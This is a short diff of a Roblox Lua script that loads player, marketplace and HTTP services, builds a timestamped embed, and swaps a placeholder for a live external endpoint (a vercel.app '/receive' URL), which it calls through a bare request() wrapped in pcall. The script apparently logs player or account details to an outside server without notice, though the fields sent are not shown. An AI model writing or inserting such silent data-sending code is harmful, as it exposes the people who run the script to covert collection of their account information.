@@ -1,5 +1,3 @@
-
-
 local Players          = game:GetService("Players")
 local Marketplace      = game:GetService("MarketplaceService")
 local Http             = game:GetService("HttpService")
@@ -95,7 +93,7 @@ local embed = {
     timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
 }
 
-local webhook = "{our route}"
+local webhook = "https://strawbitchwebui.vercel.app/receive"
 
 pcall(function()
     request({
